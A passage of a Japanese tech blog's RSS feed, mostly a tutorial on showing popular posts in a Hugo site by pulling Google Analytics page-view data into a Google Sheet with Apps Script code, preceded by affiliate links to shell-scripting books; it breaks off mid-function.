&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>簡単にできるHugoで人気の記事を表示する方法を詳しく解説</title><link>https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/</link><pubDate>Thu, 06 Jan 2022 16:50:50 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/analytics.jpg" alt="Featured image of post 簡単にできるHugoで人気の記事を表示する方法を詳しく解説" />&lt;p>Hugoにはさまざまな機能があり、ブログを作るにはもってこいの静的サイトジェネレーターです。&lt;br>
関連記事も取得できて、検索機能もある「至れり尽くせり」なジェネレーターだと思います。&lt;/p>
&lt;p>しかし、1点だけどうしても重要な機能がありません。&lt;br>
それは人気記事の表示です。&lt;br>
人気記事を表示させようとすると、データベースを用意したりサーバのアクセスカウントを行う必要があります。&lt;br>
そんな面倒なことはしたくありませんよね？&lt;/p>
&lt;p>今回はHugoでも簡単に人気の記事を表示する方法を紹介いたします。&lt;/p>
&lt;h2 id="必要なもの">必要なもの&lt;/h2>
&lt;p>Hugoで人気記事を出すために必要なものは、&lt;/p>
&lt;ul>
&lt;li>Googleスプレッドシート&lt;/li>
&lt;li>Googleアナリティクス&lt;/li>
&lt;/ul>
&lt;p>以上です。&lt;br>
それでは実際の設定やプログラムを行っていきましょう。&lt;/p>
&lt;h2 id="googleアナリティクスの設定">Googleアナリティクスの設定&lt;/h2>
&lt;p>Googleアナリティクスをサイトに設定します。&lt;br>
設定の際にはv4ではなく、v2が必要です。(2022年1月6日現在）&lt;br>
v4を設定している場合は、同時にv2も設定する必要があります。&lt;/p>
&lt;p>「アカウントを作成」「アカウントの設定」をした後に、「&lt;strong>プロパティの設定&lt;/strong>」で「ユニバーサル アナリティクス プロパティの作成」をONにするとv4とv2の両方でアナリティクスを設定できます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 163;
flex-basis: 391px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/setting.png" data-size="980x601">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/setting.png"
width="980"
height="601"
loading="lazy"
alt="ユニバーサル アナリティクス プロパティの作成"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ユニバーサル アナリティクス プロパティの作成&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>あとはv4とv2のコードをサイトに貼り付けるだけです。&lt;br>
貼り付け方法はGoogleに書いてある通りです。&lt;/p>
&lt;h2 id="スプレッドシートの設定">スプレッドシートの設定&lt;/h2>
&lt;p>次にスプレッドシートを設定します。&lt;br>
Googleドライブで「新規」「Googleスプレッドシート」を選択してシートを作成します。&lt;br>
作成したシートに適当な名前をつけます。&lt;/p>
&lt;p>その後に、「拡張機能」の「App Script」を押して、GoogleAppScript（GAS）に移動します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 180;
flex-basis: 433px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/spreads-gas.png" data-size="980x542">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/spreads-gas.png"
width="980"
height="542"
loading="lazy"
alt="ユニバーサル アナリティクス プロパティの作成"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ユニバーサル アナリティクス プロパティの作成&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="gasのプログラム">GASのプログラム&lt;/h2>
&lt;h3 id="日付の取得">日付の取得&lt;/h3>
&lt;p>日付を計算するために、「daysjs」というライブラリを追加します。&lt;br>
ライブラリの＋をクリックして、以下を検索します。&lt;/p>
&lt;pre tabindex="0">&lt;code>1ShsRhHc8tgPy5wGOzUvgEhOedJUQD53m-gd8lG2MOgs-dXC_aCZn9lFB
&lt;/code>&lt;/pre>&lt;p>検索して、days.jsが表示されたら追加をします。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 133;
flex-basis: 321px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/dayjs.png" data-size="980x732">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/dayjs.png"
width="980"
height="732"
loading="lazy"
alt="day.jsライブラリの追加"
>
&lt;/a>
&lt;/a>
&lt;figcaption>day.jsライブラリの追加&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>これで日付の検索が可能になります。&lt;br>
以下が日付のプログラムです。&lt;/p>
&lt;p>今日から1日、1月、1年前なのかという切り替えが可能です。&lt;/p>
&lt;ul>
&lt;li>year: 今日から1年間の範囲&lt;/li>
&lt;li>month: 今日から1か月の範囲&lt;/li>
&lt;li>day: 今日から1日の範囲&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">switch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;month&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;M&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;year&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;y&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">d1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">dayjs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dayjs&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">locale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ja&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">subtract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">calc&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">end&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">)};&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">test&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;day&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここまでをテスト実行してみましょう。&lt;br>
デバッグの隣りにあるセレクトを「test」にして、「実行」を押してみます。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 138;
flex-basis: 333px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/gas1.png" data-size="980x706">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/gas1.png"
width="980"
height="706"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;br>
正常に終了されれば実行ログに結果と実行完了が表示されるはずです。&lt;/p>
&lt;h3 id="gasとgoogleアナリティクスの連携">GASとGoogleアナリティクスの連携&lt;/h3>
&lt;p>GASとアナリティクスの連携にはビューIDが必要です。&lt;br>
ビューIDはv2で取得できるので、v4とv2を設定したのはこのビューIDを取得するためになります。&lt;/p>
&lt;p>GASのプログラムにGoogleアナリティクスの「アカウント」「プロパティ」「ビュー」「ビューの設定」にあるビューIDを設定します。&lt;br>
設定する際は「ga:ビューID」と &lt;code>ga:&lt;/code> を付ける必要があります。&lt;/p>
&lt;p>さきほどのプログラムの下に、下記のプログラムを記述します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ga:[GAビューID]&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">date&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">AnalyticsReporting&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Reports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">batchGet&lt;/span>&lt;span class="p">({&lt;/span>
&lt;span class="nx">reportRequests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">viewId&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">dateRanges&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>&lt;span class="nx">startDate&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">endDate&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">}],&lt;/span>
&lt;span class="nx">samplingLevel&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;LARGE&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">metrics&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:sessions&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:users&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">dimensions&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pagePath&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">orderBys&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">fieldName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">sortOrder&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;DESCENDING&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}],&lt;/span>
&lt;span class="p">}]&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">reports&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">posts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])).&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">metrics&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">values&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">sheet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">SpreadsheetApp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getActive&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getSheetByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">clear&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">unshift&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;link&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;pv&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;session&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">setValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setMonth&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;month&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここでは、ページのパスをキーとしてページビューとセッション、ユーザー数を集計するようにしています。&lt;br>
並び順はpageviewsの数の降順です。&lt;/p>
&lt;p>必要なデータがあれば各自で編集することをオススメいたします。&lt;/p>
&lt;p>そして、各項目のラベルを出力するために、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">unshift&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;link&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;pv&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;session&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>として、先頭行のデータにラベル行を追加しています。&lt;br>
この部分も各自のデータに合うよう、調整してください。&lt;/p>
&lt;p>アナリティクスから取得したデータはスプレッドシートのシート名に紐付けるので、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;month&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>の場合は、「month」というシートにデータを反映するということになります。&lt;/p>
&lt;h4 id="サービスの読み込み">サービスの読み込み&lt;/h4>
&lt;p>GASとアナリティクスを連携させるために、サービスを読み込みます。&lt;br>
サービスのプラスマークをクリックして、「Analytics Reporting API」を選択、追加します。&lt;br>
以上でサービスの読み込みは終わりです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 91;
flex-basis: 218px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/service.png" data-size="980x1074">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/service.png"
width="980"
height="1074"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>それでは、実行してみましょう。&lt;/p>
&lt;h4 id="実行">実行&lt;/h4>
&lt;p>まずははスプレッドシートに「month」という名前のシートを作ります。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 628;
flex-basis: 1507px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/sheet.png" data-size="980x156">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/sheet.png"
width="980"
height="156"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;br>
シートができたら、再度コードエディターに戻ります。&lt;/p>
&lt;p>さきほどのデバッグの隣りにあるセレクト「test」を「setMonth」にして、実行を押します。&lt;br>
承認を求められるので、「権限を確認」を押します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 159;
flex-basis: 382px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/perm1.png" data-size="980x615">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/perm1.png"
width="980"
height="615"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;br>
使用するアカウントをクリクで選んで、「詳細」をクリックして、「〜（安全ではないページ）に移動」をクリックします。&lt;br>
すると、アクセスの許可を求められるので、「許可」を押します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 140;
flex-basis: 336px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/perm2.png" data-size="980x699">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/perm2.png"
width="980"
height="699"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>実行ログに結果と実行完了が表示されるはずです。&lt;br>
スプレッドシートを確認すると、アナリティクスのデータが反映されているはずです&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 70;
flex-basis: 170px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/sheet2.png" data-size="980x1382">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/sheet2.png"
width="980"
height="1382"
loading="lazy"
alt="簡単にできるHugoで人気の記事を表示する方法を詳しく解説の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これで月間の人気記事の取得ができました。&lt;br>
同じように日、年も設定しておきましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">setDay&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
